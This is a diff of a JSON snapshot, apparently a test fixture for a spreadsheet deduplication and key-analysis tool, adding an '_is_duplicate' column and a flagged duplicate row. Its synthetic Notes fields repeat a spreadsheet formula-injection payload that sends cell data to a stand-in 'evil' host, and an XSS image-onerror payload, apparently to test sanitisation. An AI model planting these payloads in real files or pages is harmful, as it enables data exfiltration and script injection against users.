@@ -6,12 +6,9 @@
    ],
    [
     "Zip"
-   ],
-   [
-    "Account"
    ]
   ],
-  "alternatives_count": 3,
+  "alternatives_count": 2,
   "current": 100,
   "duplicate_rows_removed": "1",
   "message": "Analysis complete",
@@ -22,7 +19,7 @@
   "original_rows": 40,
   "percentage": 100,
   "rows_after_filtering": "39",
-  "selected_columns_count": 4,
+  "selected_columns_count": 2,
   "sheet_names": [
    "Main",
    "Second"
@@ -49,7 +46,8 @@
      "s:'Name'",
      "s:'Email'",
      "s:'Notes'",
-     "s:'Unique_ID'"
+     "s:'Unique_ID'",
+     "s:'_is_duplicate'"
     ],
     [
      "s:'PR-00001'",
@@ -66,7 +64,8 @@
      "s:'Alice'",
      "s:'alice0@example.com'",
      "s:'=HYPERLINK(\"http://evil/?\"&A2,\"x\")'",
-     "s:'PR-00001'"
+     "s:'PR-00001'",
+     "b:False"
     ],
     [
      "s:'PR-00002'",
@@ -83,7 +82,8 @@
      "s:'Bob'",
      "n:None",
      "s:'x|||y'",
-     "s:'PR-00002'"
+     "s:'PR-00002'",
+     "b:False"
     ],
     [
      "s:'PR-00003'",
@@ -100,7 +100,8 @@
      "s:'Carol'",
      "s:'carol2@example.com'",
      "s:'<img src=x onerror=alert(1)>'",
-     "s:'PR-00003'"
+     "s:'PR-00003'",
+     "b:False"
     ],
     [
      "s:'PR-00004'",
@@ -117,7 +118,8 @@
      "s:'Dave'",
      "s:'dave3@example.com'",
      "s:'café'",
-     "s:'PR-00004'"
+     "s:'PR-00004'",
+     "b:False"
     ],
     [
      "s:'PR-00005'",
@@ -134,7 +136,8 @@
      "s:'Alice'",
      "s:'alice4@example.com'",
      "s:'=HYPERLINK(\"http://evil/?\"&A2,\"x\")'",
-     "s:'PR-00005'"
+     "s:'PR-00005'",
+     "b:False"
     ],
     [
      "s:'PR-00006'",
@@ -151,7 +154,8 @@
      "s:'Bob'",
      "s:'bob5@example.com'",
      "s:'x|||y'",
-     "s:'PR-00006'"
+     "s:'PR-00006'",
+     "b:False"
     ],
     [
      "s:'PR-00007'",
@@ -168,7 +172,26 @@
      "s:'Carol'",
      "s:'carol6@example.com'",
      "s:'<img src=x onerror=alert(1)>'",
-     "s:'PR-00007'"
+     "s:'PR-00007'",
+     "b:False"
+    ],
+    [
+     "s:'PR-00007'",
+     "s:'01042'",
+     "n:1006",
+     "s:'9007199254740999'",
+     "n:-75",
+     "s:'N'",
+     "d:'2024-01-07T00:00:00'",
+     "s:'01/02/2024'",
+     "s:'2,5'",
+     "s:'50%'",
+     "b:True",
+     "s:'Carol'",
+     "s:'carol6@example.com'",
+     "s:'<img src=x onerror=alert(1)>'",
+     "s:'PR-00007'",
+     "b:True"
     ],
     [
      "s:'PR-00009'",
@@ -185,7 +208,8 @@
      "s:'Alice'",
      "s:'alice8@example.com'",
      "s:'=HYPERLINK(\"http://evil/?\"&A2,\"x\")'",
-     "s:'PR-00009'"
+     "s:'PR-00009'",
+     "b:False"
     ],
     [
      "s:'PR-00010'",
@@ -202,7 +226,8 @@
      "s:'Bob'",
      "s:'bob9@example.com'",
      "s:'x|||y'",
-     "s:'PR-00010'"
+     "s:'PR-00010'",
+     "b:False"
     ],
     [
      "s:'PR-00011'",
@@ -219,7 +244,8 @@
      "s:'Carol'",
      "s:'carol10@example.com'",
      "s:'<img src=x onerror=alert(1)>'",
-     "s:'PR-00011'"
+     "s:'PR-00011'",
+     "b:False"
     ],
     [
      "s:'PR-00012'",
@@ -236,7 +262,8 @@
      "s:'Dave'",
      "s:'dave11@example.com'",
      "s:'café'",
-     "s:'PR-00012'"
+     "s:'PR-00012'",
+     "b:False"
     ],
     [
      "s:'PR-00013'",
@@ -253,7 +280,8 @@
      "s:'Alice'",
      "s:'alice12@example.com'",
      "s:'=HYPERLINK(\"http://evil/?\"&A2,\"x\")'",
-     "s:'PR-00013'"
+     "s:'PR-00013'",
+     "b:False"
     ],
     [
      "s:'PR-00014'",
@@ -270,7 +298,8 @@
      "s:'Bob'",
      "s:'bob13@example.com'",
      "s:'x|||y'",
-     "s:'PR-00014'"
+     "s:'PR-00014'",
+     "b:False"
     ],
     [
      "s:'PR-00015'",
@@ -287,7 +316,8 @@
      "s:'Carol'",
      "s:'carol14@example.com'",
      "s:'<img src=x onerror=alert(1)>'",
-     "s:'PR-00015'"
+     "s:'PR-00015'",
+     "b:False"
     ],
     [
      "s:'PR-00016'",
@@ -304,7 +334,8 @@
      "s:'Dave'",
      "s:'dave15@example.com'",
      "s:'café'",
-     "s:'PR-00016'"
+     "s:'PR-00016'",
+     "b:False"
     ],
     [
      "s:'PR-00017'",
@@ -321,7 +352,8 @@
      "s:'Alice'",
      "s:'alice16@example.com'",
      "s:'=HYPERLINK(\"http://evil/?\"&A2,\"x\")'",
-     "s:'PR-00017'"
+     "s:'PR-00017'",
+     "b:False"
     ],
     [
      "s:'PR-00018'",
@@ -338,7 +370,8 @@
      "s:'Bob'",
      "s:'bob17@example.com'",
      "s:'x|||y'",
-     "s:'PR-00018'"
+     "s:'PR-00018'",
+     "b:False"
     ],
     [
      "s:'PR-00019'",
@@ -355,7 +388,8 @@
      "s:'Carol'",
      "s:'carol18@example.com'",
      "s:'<img src=x onerror=alert(1)>'",
-     "s:'PR-00019'"
+     "s:'PR-00019'",
+     "b:False"
     ],
     [
      "s:'PR-00020'",
@@ -372,7 +406,8 @@
      "s:'Dave'",
      "s:'dave19@example.com'",
      "s:'café'",
-     "s:'PR-00020'"
+     "s:'PR-00020'",
+     "b:False"
     ],
     [
      "s:'PR-00021'",
@@ -389,7 +424,8 @@
      "s:'Alice'",
      "s:'alice20@example.com'",
      "s:'=HYPERLINK(\"http://evil/?\"&A2,\"x\")'",
-     "s:'PR-00021'"
+     "s:'PR-00021'",
+     "b:False"
     ],
     [
      "s:'PR-00022'",
@@ -406,7 +442,8 @@
      "s:'Bob'",
      "s:'bob21@example.com'",
      "s:'x|||y'",
-     "s:'PR-00022'"
+     "s:'PR-00022'",
+     "b:False"
     ],
     [
      "s:'PR-00023'",
@@ -423,7 +460,8 @@
      "s:'Carol'",
      "s:'carol22@example.com'",
      "s:'<img src=x onerror=alert(1)>'",
-     "s:'PR-00023'"
+     "s:'PR-00023'",
+     "b:False"
     ],
     [
      "s:'PR-00024'",
@@ -440,7 +478,8 @@
      "s:'Dave'",
      "s:'dave23@example.com'",
      "s:'café'",
-     "s:'PR-00024'"
+     "s:'PR-00024'",
+     "b:False"
     ],
     [
      "s:'PR-00025'",
@@ -457,7 +496,8 @@
      "s:'Alice'",
      "s:'alice24@example.com'",
      "s:'=HYPERLINK(\"http://evil/?\"&A2,\"x\")'",
-     "s:'PR-00025'"
+     "s:'PR-00025'",
+     "b:False"
     ],
     [
      "s:'PR-00026'",
@@ -474,7 +514,8 @@
      "s:'Bob'",
      "s:'bob25@example.com'",
      "s:'x|||y'",
-     "s:'PR-00026'"
+     "s:'PR-00026'",
+     "b:False"
     ],
     [
      "s:'PR-00027'",
@@ -491,7 +532,8 @@
      "s:'Carol'",
      "s:'carol26@example.com'",
      "s:'<img src=x onerror=alert(1)>'",
-     "s:'PR-00027'"
+     "s:'PR-00027'",
+     "b:False"
     ],
     [
      "s:'PR-00028'",
@@ -508,7 +550,8 @@
      "s:'Dave'",
      "s:'dave27@example.com'",
      "s:'café'",
-     "s:'PR-00028'"
+     "s:'PR-00028'",
+     "b:False"
     ],
     [
      "s:'PR-00029'",
@@ -525,7 +568,8 @@
      "s:'Alice'",
      "s:'alice28@example.com'",
      "s:'=HYPERLINK(\"http://evil/?\"&A2,\"x\")'",
-     "s:'PR-00029'"
+     "s:'PR-00029'",
+     "b:False"
     ],
     [
      "s:'PR-00030'",
@@ -542,7 +586,8 @@
      "s:'Bob'",
      "s:'bob29@example.com'",
      "s:'x|||y'",
-     "s:'PR-00030'"
+     "s:'PR-00030'",
+     "b:False"
     ],
     [
      "s:'PR-00031'",
@@ -559,7 +604,8 @@
      "s:'Carol'",
      "s:'carol30@example.com'",
      "s:'<img src=x onerror=alert(1)>'",
-     "s:'PR-00031'"
+     "s:'PR-00031'",
+     "b:False"
     ],
     [
      "s:'PR-00032'",
@@ -576,7 +622,8 @@
      "s:'Dave'",
      "s:'dave31@example.com'",
      "s:'café'",
-     "s:'PR-00032'"
+     "s:'PR-00032'",
+     "b:False"
     ],
     [
      "s:'PR-00033'",
@@ -593,7 +640,8 @@
      "s:'Alice'",
      "s:'alice32@example.com'",
      "s:'=HYPERLINK(\"http://evil/?\"&A2,\"x\")'",
-     "s:'PR-00033'"
+     "s:'PR-00033'",
+     "b:False"
     ],
     [
      "s:'PR-00034'",
@@ -610,7 +658,8 @@
      "s:'Bob'",
      "s:'bob33@example.com'",
      "s:'x|||y'",
-     "s:'PR-00034'"
+     "s:'PR-00034'",
+     "b:False"
     ],
     [
      "s:'PR-00035'",
@@ -627,7 +676,8 @@
      "s:'Carol'",
      "s:'carol34@example.com'",
      "s:'<img src=x onerror=alert(1)>'",
-     "s:'PR-00035'"
+     "s:'PR-00035'",
+     "b:False"
     ],
     [
      "s:'PR-00036'",
@@ -644,7 +694,8 @@
      "s:'Dave'",
      "s:'dave35@example.com'",
      "s:'café'",
-     "s:'PR-00036'"
+     "s:'PR-00036'",
+     "b:False"
     ],
     [
      "s:'PR-00037'",
@@ -661,7 +712,8 @@
      "s:'Alice'",
      "s:'alice36@example.com'",
      "s:'=HYPERLINK(\"http://evil/?\"&A2,\"x\")'",
-     "s:'PR-00037'"
+     "s:'PR-00037'",
+     "b:False"
     ],
     [
      "s:'PR-00038'",
@@ -678,7 +730,8 @@
      "s:'Bob'",
      "s:'bob37@example.com'",
      "s:'x|||y'",
-     "s:'PR-00038'"
+     "s:'PR-00038'",
+     "b:False"
     ],
     [
      "s:'PR-00039'",
@@ -695,7 +748,8 @@
      "s:'Carol'",
      "s:'carol38@example.com'",
      "s:'<img src=x onerror=alert(1)>'",
-     "s:'PR-00039'"
+     "s:'PR-00039'",
+     "b:False"
     ],
     [
      "s:'PR-00040'",
@@ -712,7 +766,8 @@
      "s:'Dave'",
      "s:'dave39@example.com'",
      "s:'café'",
-     "s:'PR-00040'"
+     "s:'PR-00040'",
+     "b:False"
     ]
    ],
    "Key Candidates": [
@@ -729,11 +784,6 @@
     [
      "s:'#2'",
      "s:'Zip'",
-     "n:1"
-    ],
-    [
-     "s:'#3'",
-     "s:'Account'",
      "n:1"
     ]
    ]
